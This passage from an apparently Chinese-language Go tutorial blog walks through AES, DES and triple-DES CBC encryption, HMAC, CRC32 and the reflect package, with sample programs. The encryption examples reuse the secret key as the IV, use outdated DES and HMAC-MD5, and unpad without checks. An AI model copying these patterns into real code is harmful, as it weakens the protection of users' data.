UnpadData</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DecryptoAES</span><span class="params">(data []<span class="keyword">byte</span>, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> {</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br><span class="line">Decrypter := cipher.NewCBCDecrypter(block, key)</span><br><span class="line"><span class="comment">// var DecryptData []byte</span></span><br><span class="line">DecryptData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(data))</span><br><span class="line">Decrypter.CryptBlocks(DecryptData, data)</span><br><span class="line">DecryptData = unpadding(DecryptData)</span><br><span class="line"><span class="keyword">return</span> DecryptData, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncryptoAES</span><span class="params">(data []<span class="keyword">byte</span>, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> {</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br><span class="line">paddata := padding(data, block.BlockSize())</span><br><span class="line">Encrypter := cipher.NewCBCEncrypter(block, key)</span><br><span class="line">EncryptData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(paddata))</span><br><span class="line">Encrypter.CryptBlocks(EncryptData, paddata)</span><br><span class="line"><span class="keyword">return</span> EncryptData, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">data := []<span class="keyword">byte</span>(<span class="string">"Why not go far without dreams"</span>)</span><br><span class="line">key := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">16</span>)</span><br><span class="line">io.ReadFull(rand.Reader, key)</span><br><span class="line">fmt.Println(key)</span><br><span class="line">endata, _ := EncryptoAES(data, key)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(endata))</span><br><span class="line">dedata, _ := DecryptoAES(endata, key)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(dedata))</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="crypto-des"><a href="#crypto-des" class="headerlink" title="crypto/des"></a>crypto/des</h4><p><code>crypto/des</code>包中实现了des加密和三重des加密<br>des加密</p><blockquote><p>和aes差不多，就改一下方法就行了</p></blockquote><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">"bytes"</span><br><span class="line">"crypto/des"</span><br><span class="line">"crypto/cipher"</span><br><span class="line">"crypto/rand"</span><br><span class="line">"fmt"</span><br><span class="line">"io"</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">func padding(data []byte, BlackSize int) []byte {</span><br><span class="line">PadLen := BlackSize - len(data)%BlackSize</span><br><span class="line">PadData := bytes.Repeat([]byte{byte(PadLen)}, PadLen)</span><br><span class="line">return append(data, PadData...)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func unpadding(data []byte) []byte {</span><br><span class="line">n := len(data)</span><br><span class="line">UnpadLen := int(data[n-1])</span><br><span class="line">UnpadData := data[:n-UnpadLen]</span><br><span class="line">return UnpadData</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func DecryptoDES(data []byte, key []byte) ([]byte, error) {</span><br><span class="line">block, err := des.NewCipher(key)</span><br><span class="line">if err != nil {</span><br><span class="line">return nil, err</span><br><span class="line">}</span><br><span class="line">Decrypter := cipher.NewCBCDecrypter(block, key)</span><br><span class="line">DecryptData := make([]byte, len(data))</span><br><span class="line">Decrypter.CryptBlocks(DecryptData, data)</span><br><span class="line">DecryptData = unpadding(DecryptData)</span><br><span class="line">return DecryptData, nil</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func EncryptoDES(data []byte, key []byte) ([]byte, error) {</span><br><span class="line">block, err := des.NewCipher(key)</span><br><span class="line">if err != nil {</span><br><span class="line">return nil, err</span><br><span class="line">}</span><br><span class="line">paddata := padding(data, block.BlockSize())</span><br><span class="line">Encrypter := cipher.NewCBCEncrypter(block, key)</span><br><span class="line">EncryptData := make([]byte, len(paddata))</span><br><span class="line">Encrypter.CryptBlocks(EncryptData, paddata)</span><br><span class="line">return EncryptData, nil</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func main() {</span><br><span class="line">data := []byte("Why not go far without dreams")</span><br><span class="line">key := make([]byte, 8) // key的长度必须为8</span><br><span class="line">io.ReadFull(rand.Reader, key)</span><br><span class="line">fmt.Println(key)</span><br><span class="line">endata, _ := EncryptoDES(data, key)</span><br><span class="line">fmt.Println(string(endata))</span><br><span class="line">dedata, _ := DecryptoDES(endata, key)</span><br><span class="line">fmt.Println(string(dedata))</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>3des<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"bytes"</span></span><br><span class="line"><span class="string">"crypto/des"</span></span><br><span class="line"><span class="string">"crypto/cipher"</span></span><br><span class="line"><span class="string">"crypto/rand"</span></span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"io"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">padding</span><span class="params">(data []<span class="keyword">byte</span>, BlackSize <span class="keyword">int</span>)</span> []<span class="title">byte</span></span> {</span><br><span class="line">PadLen := BlackSize - <span class="built_in">len</span>(data)%BlackSize</span><br><span class="line">PadData := bytes.Repeat([]<span class="keyword">byte</span>{<span class="keyword">byte</span>(PadLen)}, PadLen)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(data, PadData...)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">unpadding</span><span class="params">(data []<span class="keyword">byte</span>)</span> []<span class="title">byte</span></span> {</span><br><span class="line">n := <span class="built_in">len</span>(data)</span><br><span class="line">UnpadLen := <span class="keyword">int</span>(data[n<span class="number">-1</span>])</span><br><span class="line">UnpadData := data[:n-UnpadLen]</span><br><span class="line"><span class="keyword">return</span> UnpadData</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DecryptoTripleDES</span><span class="params">(data []<span class="keyword">byte</span>, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> {</span><br><span class="line">block, err := des.NewTripleDESCipher(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br><span class="line">Decrypter := cipher.NewCBCDecrypter(block, key[:<span class="number">8</span>])</span><br><span class="line">DecryptData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(data))</span><br><span class="line">Decrypter.CryptBlocks(DecryptData, data)</span><br><span class="line">DecryptData = unpadding(DecryptData)</span><br><span class="line"><span class="keyword">return</span> DecryptData, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">EncryptoTripleDES</span><span class="params">(data []<span class="keyword">byte</span>, key []<span class="keyword">byte</span>)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> {</span><br><span class="line">block, err := des.NewTripleDESCipher(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">}</span><br><span class="line">paddata := padding(data, block.BlockSize())</span><br><span class="line">Encrypter := cipher.NewCBCEncrypter(block, key[:<span class="number">8</span>]) <span class="comment">//vi的值必须为8，不然就会panic</span></span><br><span class="line">EncryptData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="built_in">len</span>(paddata))</span><br><span class="line">Encrypter.CryptBlocks(EncryptData, paddata)</span><br><span class="line"><span class="keyword">return</span> EncryptData, <span class="literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">data := []<span class="keyword">byte</span>(<span class="string">"Why not go far without dreams"</span>)</span><br><span class="line">key := <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">24</span>) <span class="comment">// key的长度必须为24</span></span><br><span class="line">io.ReadFull(rand.Reader, key)</span><br><span class="line">fmt.Println(key)</span><br><span class="line">endata, _ := EncryptoTripleDES(data, key)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(endata))</span><br><span class="line">dedata, _ := DecryptoTripleDES(endata, key)</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(dedata))</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="crypto-hmac"><a href="#crypto-hmac" class="headerlink" title="crypto/hmac"></a>crypto/hmac</h4><blockquote><p>HMAC是使用密钥对消息进行签名的加密散列</p></blockquote><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//用hmac对hash值进行签名</span></span><br><span class="line">key:=[]<span class="keyword">byte</span>(<span class="string">"salted"</span>)</span><br><span class="line">message:=[]<span class="keyword">byte</span>(<span class="string">"Why not go far without dreams"</span>)</span><br><span class="line">enhash:=hmac.New(md5.New,key)</span><br><span class="line">enhash.Write(message)</span><br><span class="line">fmt.Printf(<span class="string">"%x\n"</span>,enhash.Sum(<span class="literal">nil</span>))</span><br><span class="line"><span class="comment">//校验</span></span><br><span class="line">hash:=[]<span class="keyword">byte</span> {<span class="number">28</span> ,<span class="number">171</span> ,<span class="number">78</span> ,<span class="number">222</span> ,<span class="number">246</span> ,<span class="number">68</span> ,<span class="number">186</span> ,<span class="number">131</span> ,<span class="number">28</span> ,<span class="number">11</span> ,<span class="number">246</span> ,<span class="number">196</span> ,<span class="number">249</span> ,<span class="number">129</span> ,<span class="number">172</span> ,<span class="number">228</span>}</span><br><span class="line">fmt.Println(hmac.Equal(enhash.Sum(<span class="literal">nil</span>),hash))</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"><span class="number">1</span>cab4edef644ba831c0bf6c4f981ace4</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure><h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><h4 id="hash-crc32"><a href="#hash-crc32" class="headerlink" title="hash/crc32"></a>hash/crc32</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:=crc32.ChecksumIEEE([]<span class="keyword">byte</span>(<span class="string">"crc32"</span>)) <span class="comment">//压缩包的是采用CRC-32-IEEE 802.3标准</span></span><br><span class="line">fmt.Println(data)</span><br></pre></td></tr></tbody></table></figure><h3 id="reflect"><a href="#reflect" class="headerlink" title="reflect"></a>reflect</h3><p><strong>注意</strong>：go语言里面struct里面变量如果大写开头则是public,如果是小写开头则是private的，private的时候通过反射不能获取其值，否则会出现如下panic<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">panic: reflect.Value.Interface: cannot return value obtained from unexported field or method</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="从实例到-Value"><a href="#从实例到-Value" class="headerlink" title="从实例到 Value"></a>从实例到 Value</h4><p>通过实例获取 Value 对象，直接使用 reflect.ValueOf() 函数。例如：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ValueOf</span><span class="params">(i <span class="keyword">interface</span> {})</span> <span class="title">Value</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="从实例到-Type"><a href="#从实例到-Type" class="headerlink" title="从实例到 Type"></a>从实例到 Type</h4><p>通过实例获取反射对象的 Type，直接使用 reflect.TypeOf() 函数。例如：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">TypeOf</span><span class="params">(i <span class="keyword">interface</span>{})</span> <span class="title">Type</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="从Value到实例"><a href="#从Value到实例" class="headerlink" title="从Value到实例"></a>从Value到实例</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//该方法最通用，用来将 Value 转换为空接口，该空接口内部存放具体类型实例</span></span><br><span class="line"><span class="comment">//可以使用接口类型查询去还原为具体的类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Value)</span> <span class="title">Interface</span><span class="params">()</span> （<span class="title">i</span> <span class="title">interface</span></span>{})</span><br><span class="line"></span><br><span class="line"><span class="comment">//Value 自身也提供丰富的方法，直接将 Value 转换为简单类型实例，如果类型不匹配，则会返回"&lt;" + v.Type().String() + " Value&gt;"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Value)</span> <span class="title">Bool</span> <span class="params">()</span> <span class="title">bool</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(v Value)</span> <span class="title">Float</span><span class="params">()</span> <span class="title">float64</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(v Value)</span> <span class="title">Int</span><span class="params">()</span> <span class="title">int64</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="params">(v Value)</span> <span class="title">Uint</span><span class="params">()</span> <span class="title">uint64</span></span></span><br></pre></td></tr></tbody></table></figure><h4 id="从-Value-到-Type"><a href="#从-Value-到-Type" class="headerlink" title="从 Value 到 Type"></a>从 Value 到 Type</h4><p>从反射对象 Value 到 Type 可以直接调用 Type 的方法，因为 Value 内部存放着到 Type 类型的指针。例如：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Value)</span> <span class="title">Type</span><span class="params">()</span> <span class="title">Type</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="从-Value-的指针到值"><a href="#从-Value-的指针到值" class="headerlink" title="从 Value 的指针到值"></a>从 Value 的指针到值</h4><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">从一个指针类型的 Value 获得值类型 Value 有两种方法，示例如下。</span><br><span class="line"><span class="comment">//如果 v 类型是接口，则 Elem() 返回接口绑定的实例的 Value，如采 v 类型是指针，则返回指针值的 Value，否则引起 panic</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Value)</span> <span class="title">Elem</span><span class="params">()</span> <span class="title">Value</span></span></span><br><span class="line"><span class="function">//如果 <span class="title">v</span> 是指针，则返回指针值的 <span class="title">Value</span>，否则返回 <span class="title">v</span> 自身，该函数不会引起 <span class="title">panic</span></span></span><br><span class="line"><span class="function"><span class="title">func</span> <span class="title">Indirect</span><span class="params">(v Value)</span> <span class="title">Value</span></span></span><br></pre></td></tr></tbody></table></figure><h4 id="Value-值的可修改性"><a href="#Value-值的可修改性" class="headerlink" title="Value 值的可修改性"></a>Value 值的可修改性</h4><p>Value 值的修改涉及如下两个方法：<br>//通过 CanSet 判断是否能修改<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func (v Value ) CanSet() bool</span><br></pre></td></tr></tbody></table></figure><p></p><p>//通过 Set 进行修改<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">func (v Value ) Set(x Value)</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>实例1<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> f <span class="keyword">float64</span> = <span class="number">3.1</span></span><br><span class="line">v := reflect.ValueOf(&amp;f)</span><br><span class="line">fmt.Println(<span class="string">"Canset: "</span>,v.CanSet())</span><br><span class="line">fv:=v.Elem()</span><br><span class="line">fmt.Println(<span class="string">"Canset: "</span>,fv.CanSet())</span><br><span class="line">fv.SetFloat(<span class="number">3.14</span>)</span><br><span class="line">fmt.Println(f)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>实例2<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> {</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age  <span class="keyword">uint16</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">zhangsan := person{<span class="string">"zhangsan"</span>, <span class="number">20</span>}</span><br><span class="line">v := reflect.ValueOf(&amp;zhangsan).Elem()</span><br><span class="line">t := v.Type()</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; v.NumField(); i++ {</span><br><span class="line">f := v.Field(i)</span><br><span class="line">tt := t.Field(i)</span><br><span class="line">fmt.Println(tt.Name, f.Interface(), tt.Type)</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>实例3，通过反射修改结构体的值：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> {</span><br><span class="line">Name <span class="keyword">string</span></span><br><span class="line">Age  <span class="keyword">uint16</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">zhangsan := person{<span class="string">"zhangsan"</span>, <span class="number">20</span>}</span><br><span class="line">v := reflect.ValueOf(&amp;zhangsan).Elem()</span><br><span class="line">name:=<span class="string">"qiyou"</span></span><br><span class="line">n:=reflect.ValueOf(name)</span><br><span class="line">v.FieldByName(<span class="string">"Name"</span>).Set(n)</span><br><span class="line">fmt.Println(v.Field(<span class="number">0</span>).Interface())</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="Name和Kind的区别"><a href="#Name和Kind的区别" class="headerlink" title="Name和Kind的区别"></a>Name和Kind的区别</h4><p>Go 程序中的类型（Type）指的是系统原生数据类型，如 int、string、bool、float32 等类型，以及使用 type 关键字定义的类型，这些类型的名称就是其类型本身的名称（Name）。例如使用 type A struct{} 定义结构体时，A 就是 struct{} 的类型。</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> myint <span class="keyword">int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> {</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line"><span class="keyword">var</span> i myint</span><br><span class="line">zhangsan:=person{}</span><br><span class="line">t1:=reflect.TypeOf(i)</span><br><span class="line">t2:=reflect.TypeOf(zhangsan)</span><br><span class="line">fmt.Println(t1.Name(),t1.Kind())</span><br><span class="line">fmt.Println(t2.Name(),t2.Kind())</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">myint <span class="keyword">int</span></span><br><span class="line">person <span class="keyword">struct</span></span><br></pre></td></tr></tbody></table></figure><h4 id="通过反射获取指针指向的元素类型"><a href="#通过反射获取指针指向的元素类型" class="headerlink" title="通过反射获取指针指向的元素类型"></a>通过反射获取指针指向的元素类型</h4><p>Go语言程序中对指针获取反射对象时，可以通过<code>reflect.Elem()</code> 方法获取这个指针指向的元素类型。这个获取过程被称为取元素，等效于对指针类型变量做了一个*操作</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">"fmt"</span></span><br><span class="line"><span class="string">"reflect"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> person <span class="keyword">struct</span> {</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">zhangsan:=person{}</span><br><span class="line">t:=reflect.TypeOf(&amp;zhangsan)</span><br><span class="line">fmt.Println(t.Name(),t.Kind())</span><br><span class="line">et:=t.Elem()</span><br><span class="line">fmt.Println(et.Name(),et.Kind())</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line"> ptr <span class="comment">//Go 语言的反射中对所有指针变量的种类都是 Ptr，但注意，指针变量的类型名称是空，不是*person</span></span><br><span class="line">person <span class="keyword">struct</span></span><br></pre></td></tr></tbody></table></figure><h4 id="结构体标签"><a href="#结构体标签" class="headerlink" title="结构体标签"></a>结构体标签</h4><blockquote><p>结构体标签由一个或多个键值对组成。键与值使用冒号分隔，值用双引号括起来。键值对之间使用一个空格分隔。</p></blockquote><p>从结构体标签中获取值<br>StructTag 拥有一些方法，可以进行 Tag 信息的解析和提取，如下所示：<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(tag StructTag)</span><span class="title">Get</span><span class="params">(key <span class="keyword">string</span>)</span><span class="title">string</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>根据 Tag 中的键获取对应的值，例如<code>key1:"value1"key2:"value2"</code> 的 Tag 中，可以传入“key1”获得“value1”。<br></p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span><span class="params">(tag StructTag)</span><span class="title">Lookup</span><span class="params">(key <span class="keyword">string</span>)</span><span class="params">(value <span class="keyword">string</span>,ok <span class="keyword">bool</span>)</span></span></span><br></pre></td></tr></tbody></table></figure><p></p><p>根据 Tag 中的键，查询值是否存在</p><figure class="highlight golang"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 